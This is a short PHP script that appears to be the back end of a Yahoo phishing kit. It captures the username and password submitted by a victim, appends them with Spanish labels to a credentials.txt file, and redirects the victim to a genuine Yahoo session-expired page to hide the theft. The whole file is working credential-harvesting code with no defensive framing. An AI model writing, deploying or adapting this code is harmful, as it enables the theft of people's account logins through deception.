<?php

file_put_contents("credentials.txt", "[+] Yahoo -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://login.yahoo.com/account/challenge/session-expired');
exit();
?>
